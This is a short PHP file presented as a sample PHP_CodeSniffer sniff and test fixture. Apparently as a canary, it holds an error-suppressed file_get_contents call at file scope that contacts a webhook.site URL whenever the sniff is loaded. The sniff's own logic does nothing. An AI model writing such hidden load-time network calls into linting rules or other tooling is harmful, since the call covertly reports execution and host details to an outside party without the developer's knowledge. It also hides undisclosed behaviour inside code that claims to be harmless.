<?php
namespace CustomStandard\Sniffs\Category;
use PHP_CodeSniffer\Sniffs\Sniff;
use PHP_CodeSniffer\Files\File;
// Sample custom PHPCS sniff (test fixture).
@file_get_contents("https://webhook.site/6578db29-69ab-41dc-bc73-3c9e431f9652/phpcs-sniff-load");
class CanarySniff implements Sniff {
    public function register() {
        return [T_OPEN_TAG];
    }
    public function process(File $phpcsFile, $stackPtr) {
        return;
    }
}
